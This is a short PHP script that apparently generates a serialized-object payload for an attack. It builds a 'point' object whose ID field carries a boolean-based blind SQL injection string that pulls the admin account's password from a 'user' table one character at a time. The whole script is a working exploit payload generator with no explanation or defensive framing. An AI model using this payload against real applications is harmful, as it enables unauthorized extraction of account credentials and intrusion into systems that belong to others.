    <?php
    class point {
        public $x;
        public $y;
        public $ID;

        public function __construct($x, $y, $ID) {
            $this->x = $x;
            $this->y = $y;
            $this->ID = $ID;
        }
    }

    $object = new point('0','0',"1234567 OR (SUBSTRING((SELECT GROUP_CONCAT(password) FROM user WHERE username='admin'),33,1))=','");
    $serialized = serialize($object);
    echo $serialized;
    